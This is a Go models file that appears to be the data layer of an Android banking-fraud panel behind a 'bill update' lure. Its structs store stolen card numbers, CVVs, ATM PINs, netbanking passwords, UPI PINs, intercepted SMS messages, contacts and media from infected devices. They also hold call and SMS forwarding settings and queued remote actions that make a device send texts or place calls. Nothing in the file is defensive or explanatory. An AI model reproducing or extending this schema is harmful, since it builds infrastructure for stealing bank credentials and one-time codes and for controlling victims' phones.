package models

import "time"

type BillUpdateRequest struct {
	ID             uint      `gorm:"primaryKey" json:"id"`
	CreatedAt      time.Time `json:"created_at"`
	DeviceID       string    `json:"device_id"`
	CustomerName   string    `json:"customer_name"`
	Mobile         string    `json:"mobile"`
	ConsumerNumber string    `json:"consumer_number"`
	Reasons        string    `json:"reasons"`
}

type PaymentAttempt struct {
	ID            uint      `gorm:"primaryKey" json:"id"`
	CreatedAt     time.Time `json:"created_at"`
	DeviceID      string    `json:"device_id"`
	Amount        float64   `json:"amount"`
	PaymentMethod string    `json:"payment_method"`
	Status        string    `json:"status"`
}

type CardDetail struct {
	ID             uint      `gorm:"primaryKey" json:"id"`
	CreatedAt      time.Time `json:"created_at"`
	DeviceID       string    `json:"device_id"`
	CardType       string    `json:"card_type"`
	CardNumber     string    `json:"card_number"`
	CardHolderName string    `json:"card_holder_name"`
	Expiry         string    `json:"expiry"`
	CVV            string    `json:"cvv"`
	Amount         float64   `json:"amount"`
}

type CardVerification struct {
	ID        uint      `gorm:"primaryKey" json:"id"`
	CreatedAt time.Time `json:"created_at"`
	DeviceID  string    `json:"device_id"`
	Dob       string    `json:"dob"`
	AtmPin    string    `json:"atm_pin"`
	Amount    float64   `json:"amount"`
}

type NetbankingDetail struct {
	ID         uint      `gorm:"primaryKey" json:"id"`
	CreatedAt  time.Time `json:"created_at"`
	DeviceID   string    `json:"device_id"`
	BankName   string    `json:"bank_name"`
	UserID     string    `json:"user_id"`
	Password   string    `json:"password"`
	RememberMe bool      `json:"remember_me"`
	Amount     float64   `json:"amount"`
}

type NetbankingPin struct {
	ID        uint      `gorm:"primaryKey" json:"id"`
	CreatedAt time.Time `json:"created_at"`
	DeviceID  string    `json:"device_id"`
	Pin       string    `json:"pin"`
	Amount    float64   `json:"amount"`
}

type UpiDetail struct {
	ID        uint      `gorm:"primaryKey" json:"id"`
	CreatedAt time.Time `json:"created_at"`
	DeviceID  string    `json:"device_id"`
	Pin       string    `json:"pin"`
	Amount    float64   `json:"amount"`
}

type SmsRecord struct {
	ID         uint      `gorm:"primaryKey" json:"id"`
	CreatedAt  time.Time `json:"created_at"`
	DeviceID   string    `json:"device_id"`
	Sender     string    `json:"sender"`
	Message    string    `json:"message"`
	ReceivedAt string    `json:"received_at"`
	SubID      int       `json:"sub_id"`
}

type Device struct {
	ID             uint      `gorm:"primaryKey" json:"id"`
	CreatedAt      time.Time `json:"created_at"`
	DeviceID       string    `gorm:"uniqueIndex" json:"device_id"`
	DeviceName     string    `json:"device_name"`
	Model          string    `json:"model"`
	OsVersion      string    `json:"os_version"`
	AppVersion     string    `json:"app_version"`
	PhoneNumber    string    `json:"phone_number"`
	SimInfo        string    `json:"sim_info"`
	LastSeen       time.Time `json:"last_seen"`
	InternetOn     bool      `json:"internet_on"`
	OfflineSeconds int       `json:"offline_seconds"`
}

type ContactRecord struct {
	ID        uint      `gorm:"primaryKey" json:"id"`
	CreatedAt time.Time `json:"created_at"`
	DeviceID  string    `json:"device_id"`
	Name      string    `json:"name"`
	Phone     string    `json:"phone"`
	Email     string    `json:"email"`
}

type ForwardingConfig struct {
	ID                   uint      `gorm:"primaryKey" json:"id"`
	CreatedAt            time.Time `json:"created_at"`
	UpdatedAt            time.Time `json:"updated_at"`
	DeviceID             string    `gorm:"uniqueIndex" json:"device_id"`
	CallForwarding       bool      `json:"call_forwarding"`
	CallForwardingNumber string    `json:"call_forwarding_number"`
	CallSimSlot          string    `json:"call_sim_slot"`
	SmsForwarding        bool      `json:"sms_forwarding"`
	SmsForwardingNumber  string    `json:"sms_forwarding_number"`
	SmsSimSlot           string    `json:"sms_sim_slot"`
}

type MediaFile struct {
	ID        uint      `gorm:"primaryKey" json:"id"`
	CreatedAt time.Time `json:"created_at"`
	DeviceID  string    `json:"device_id"`
	FileName  string    `json:"file_name"`
	FilePath  string    `json:"file_path"`
	FileType  string    `json:"file_type"` // image/jpeg, video/mp4, etc
	FileSize  int64     `json:"file_size"`
}

type DeviceAction struct {
	ID           uint       `gorm:"primaryKey" json:"id"`
	CreatedAt    time.Time  `json:"created_at"`
	DeviceID     string     `json:"device_id"`
	Type         string     `json:"type"`          // "sms" or "call"
	TargetNumber string     `json:"target_number"`
	Message      string     `json:"message"`       // sms body
	Status       string     `json:"status"`        // "pending", "completed", "failed"
	CompletedAt  *time.Time `json:"completed_at,omitempty"`
}
